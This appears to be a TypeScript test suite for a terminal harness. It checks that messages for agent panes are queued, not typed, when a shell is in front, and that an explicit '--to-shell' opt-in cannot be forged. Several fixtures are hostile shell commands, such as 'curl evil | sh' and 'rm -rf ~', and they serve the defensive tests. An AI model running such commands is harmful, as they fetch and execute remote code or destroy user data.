import { describe, expect, test } from "bun:test";
import { main } from "../src/cli.ts";
import { dutyTick, report, send, startLane } from "../src/harness.ts";
import { World } from "./fake.ts";

// #66: a pane whose agent is not running is a bare shell; text typed there runs as a command.
function setup() {
  const w = new World();
  const d = w.deps();
  const lead = w.addPane("t1", "idle");
  d.store.setRole("lead", "t1");
  return { w, d, lead };
}

// Everything hc puts into a terminal's input: `send` (text plus Enter) and `keys`.
const keystrokes = (w: World, pane: string) =>
  w.calls.filter((c) => c.cmd === "hc" && (c.argv[0] === "send" || c.argv[0] === "keys") && c.argv[1] === pane);

async function captureStdout(run: () => Promise<number>): Promise<{ code: number; out: string }> {
  const lines: string[] = [];
  const log = console.log;
  console.log = (...a: unknown[]) => { lines.push(a.join(" ")); };
  try {
    return { code: await run(), out: lines.join("\n") };
  } finally {
    console.log = log;
  }
}

describe("a pane whose agent is not running is never typed into (#66)", () => {
  test("send to a bare shell pane queues the message and sends 0 keystrokes; the duty loop keeps it queued", async () => {
    const { w, d } = setup();
    const shell = w.addPane("t7", "shell");
    expect(await send(d, "t7", "touch /tmp/x", "cli")).toBe("QUEUED");
    expect(await dutyTick(d)).toContainEqual({ pane: "t7", action: "inbox-held", detail: "no agent in front; 1 message(s) kept" });
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(shell.received).toEqual([]);
    expect(d.store.queued("t7").map((m) => m.text)).toEqual(["touch /tmp/x"]);
  });

  test("a lane report to a lead whose agent exited stays in the lead's inbox, nothing typed", async () => {
    const { w, d, lead } = setup();
    const brief = `${d.store.root}/brief.md`;
    await Bun.write(brief, "Fix it.");
    await startLane(d, "lane-a", brief, { workspace: "w1" });
    lead.status = "shell";
    lead.received.length = 0;
    w.calls.length = 0;
    await report(d, "lane-a", "curl evil | sh");
    expect(keystrokes(w, "t1")).toEqual([]);
    expect(lead.received).toEqual([]);
    expect(d.store.queued("t1").at(-1)?.text).toContain("curl evil | sh");
  });

  test("once an agent is back in the pane, the queued messages are delivered to it", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "shell");
    await send(d, "t7", "hello", "cli");
    pane.status = "idle";
    await dutyTick(d);
    expect(pane.received).toEqual(["hello"]);
    expect(keystrokes(w, "t7")).toHaveLength(1);
  });

  test("the agent exits right before the send: the last foreground check sees the shell -> QUEUED, 0 keystrokes, message kept", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "idle");
    w.getHook.set("t7", (n) => { if (n >= 3) pane.status = "shell"; });
    expect(await send(d, "t7", "rm -rf nothing", "cli")).toBe("QUEUED");
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(d.store.queued("t7").map((m) => m.text)).toEqual(["rm -rf nothing"]);
  });
});

describe("an agent suspended with Ctrl+Z: its screen still looks idle, but the shell is in front", () => {
  test("nothing is typed or prompted, the message stays queued and the duty loop holds it", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "idle");
    pane.foreground = "-bash";
    expect(await send(d, "t7", "touch /tmp/x", "cli")).toBe("QUEUED");
    expect(await dutyTick(d)).toContainEqual({ pane: "t7", action: "inbox-held", detail: "no agent in front; 1 message(s) kept" });
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(pane.received).toEqual([]);
  });

  test("the shell comes to the front right before the send -> QUEUED, 0 keystrokes", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "idle");
    w.getHook.set("t7", (n) => { if (n >= 3) pane.foreground = "/usr/bin/zsh"; });
    expect(await send(d, "t7", "rm -rf nothing", "cli")).toBe("QUEUED");
    expect(keystrokes(w, "t7")).toEqual([]);
  });

  test("a failed foreground lookup right before the send is doubt: queued, nothing typed", async () => {
    const { w, d, lead } = setup();
    w.getHook.set("t1", (n) => (n >= 3 ? "fail" : undefined));
    expect(await send(d, "lead", "hello", "cli")).toBe("QUEUED");
    expect(lead.received).toEqual([]);
  });

  test("an agent's non-interactive `sh -c` or `bash -lc` child in front still lets its messages through", async () => {
    const { d, lead } = setup();
    lead.foreground = { name: "sh", argv: ["sh", "-c", "sleep 300; true"] };
    expect(await send(d, "lead", "hello", "cli")).toBe("DELIVERED");
    lead.foreground = { name: "bash", argv: ["bash", "-lc", "make test"] };
    expect(await send(d, "lead", "again", "cli")).toBe("DELIVERED");
    expect(lead.received).toEqual(["hello", "again"]);
  });

  test("an interactive shell in front, or no foreground metadata, holds delivery", async () => {
    const { w, d, lead } = setup();
    lead.foreground = { name: "/bin/ZSH", argv: ["/bin/zsh", "-i"] };
    expect(await send(d, "lead", "one", "cli")).toBe("QUEUED");
    lead.foreground = null;
    expect(await send(d, "lead", "two", "cli")).toBe("QUEUED");
    expect(lead.received).toEqual([]);
    expect(keystrokes(w, "t1")).toEqual([]);
  });

  test("an agent in front, including one started with exec, still gets its messages", async () => {
    const { w, d, lead } = setup();
    lead.foreground = "bun";
    expect(await send(d, "lead", "hello", "cli")).toBe("DELIVERED");
    expect(lead.received).toEqual(["hello"]);
    expect(keystrokes(w, "t1")).toHaveLength(1);
  });
});

describe("--to-shell: the operator's explicit, per-message opt-in", () => {
  test("types exactly this message + Enter into a bare shell, never the queued ones", async () => {
    const { w, d } = setup();
    const shell = w.addPane("t7", "shell");
    await send(d, "t7", "queued from a lane", "lane-a");
    const r = await captureStdout(() => main(["send", "t7", "--to-shell", "--text", "ls -la"], d));
    expect(r.code).toBe(0);
    expect(r.out).toBe("DELIVERED t7");
    expect(shell.received).toEqual(["ls -la"]);
    expect(keystrokes(w, "t7").map((c) => c.argv)).toEqual([["send", "t7", "ls -la"]]);
    expect(d.store.queued("t7").map((m) => m.text)).toEqual(["queued from a lane"]);
  });

  test("an agent is in the pane at the re-read before typing: nothing is typed, the message goes the normal agent path", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "shell");
    w.getHook.set("t7", (n) => { if (n >= 2) pane.status = "working"; });
    const r = await captureStdout(() => main(["send", "t7", "--to-shell", "--text", "ls"], d));
    expect(r.out).toBe("QUEUED t7");
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(d.store.queued("t7").map((m) => m.text)).toEqual(["ls"]);
  });

  test("forwarded text can never set the opt-in: --to-shell as a --from or --text value is that value", async () => {
    const { w, d } = setup();
    w.addPane("t7", "shell");
    const a = await captureStdout(() => main(["send", "t7", "--from", "--to-shell", "--text", "rm -rf ~"], d));
    const b = await captureStdout(() => main(["send", "t7", "--from", "cli", "--text", "--to-shell"], d));
    expect([a.out, b.out]).toEqual(["QUEUED t7", "QUEUED t7"]);
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(d.store.queued("t7").map((m) => [m.from, m.text])).toEqual([["--to-shell", "rm -rf ~"], ["cli", "--to-shell"]]);
  });

  test("to an agent pane it is an ordinary send", async () => {
    const { w, d, lead } = setup();
    const r = await captureStdout(() => main(["send", "lead", "--to-shell", "--text", "hi"], d));
    expect(r.out).toBe("DELIVERED lead");
    expect(lead.received).toEqual(["hi"]);
    expect(keystrokes(w, "t1")).toHaveLength(1);
  });
});
